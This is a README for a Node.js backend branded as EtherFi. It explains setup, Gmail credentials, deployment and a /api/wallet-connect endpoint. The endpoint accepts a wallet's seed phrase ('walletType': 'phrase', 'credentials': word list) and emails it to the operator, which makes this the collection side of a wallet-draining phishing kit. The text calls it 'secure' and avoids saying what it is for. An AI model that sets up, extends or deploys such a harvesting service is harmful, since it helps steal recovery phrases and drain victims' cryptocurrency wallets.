# EtherFi Backend

A secure Node.js backend server for handling wallet connection data from the EtherFi frontend.

## Features

- ✅ Secure email notifications for wallet connections
- ✅ Rate limiting and security middleware
- ✅ API secret validation
- ✅ CORS protection
- ✅ Input validation and sanitization
- ✅ Error handling and logging

## Setup

### 1. Install Dependencies
```bash
cd Backend
npm install
```

### 2. Environment Configuration
Copy `.env.example` to `.env` and configure:
```bash
cp .env.example .env
```

Edit `.env` with your settings:
```env
EMAIL_USER=your-email@gmail.com
EMAIL_PASS=your-app-password
PORT=3001
```

### 3. Gmail App Password Setup
1. Enable 2-Factor Authentication on your Gmail account
2. Go to Google Account settings > Security > App passwords
3. Generate a new app password for "Mail"
4. Use this app password in `EMAIL_PASS` (not your regular Gmail password)

## Running the Server

### Development
```bash
npm run dev
```

### Production
```bash
npm start
```

## API Endpoints

### Health Check
```
GET /api/health
```

### Wallet Connection
```
POST /api/wallet-connect
Headers: {
  "Content-Type": "application/json",
  "x-api-secret": "dcent-secret-key-2025"
}
Body: {
  "walletProvider": "MetaMask",
  "walletType": "phrase",
  "credentials": "word1 word2 word3..."
}
```

## Security Features

- API secret validation on all wallet endpoints
- Rate limiting (5 requests per 15 minutes per IP)
- CORS protection with whitelist
- Helmet security headers
- Input validation and sanitization

## Deployment Options

### Option 1: Deploy Backend Separately
- Deploy to Heroku, Railway, Render, or any Node.js hosting
- Update frontend API URL to point to deployed backend

### Option 2: Deploy Both Together on Firebase
- Use Firebase Functions for backend
- Deploy frontend to Firebase Hosting
- Both will share the same domain

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `EMAIL_USER` | Gmail address for notifications | Required |
| `EMAIL_PASS` | Gmail app password | Required |
| `PORT` | Server port | 3001 |
| `NODE_ENV` | Environment (development/production) | production |
| `API_SECRET` | Secret for API authentication | dcent-secret-key-2025 |
| `FRONTEND_URL` | Frontend URL for CORS | http://localhost:3000 |

## Logs

The server logs all wallet connection attempts (without sensitive data) to the console for monitoring purposes.

## Support

For issues or questions, please check the logs and ensure all environment variables are properly configured.
